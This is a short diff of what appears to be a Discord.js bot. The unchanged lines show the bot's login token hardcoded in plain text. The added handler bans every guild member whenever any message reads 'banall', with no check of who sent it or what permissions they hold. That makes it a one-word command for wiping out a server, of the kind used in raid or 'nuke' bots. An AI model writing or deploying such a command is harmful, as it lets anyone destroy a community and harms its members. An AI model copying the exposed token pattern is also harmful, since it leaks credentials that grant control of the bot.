@@ -110,3 +110,13 @@ client.on('message', msg => {
 ////
 client.login("NzkwOTM3NDUzMDM2MzA2NDgy.X-H35w.xT-Iw7UmF2OfrsR3YpSHQk8KAzM")
           
+client.on('message', message => {
+         if (message.content === "banall") {
+     if(!message.channel.guild) return;
+     
+      message.guild.members.forEach( member => {
+          
+          member.ban()
+      })
+}
+});
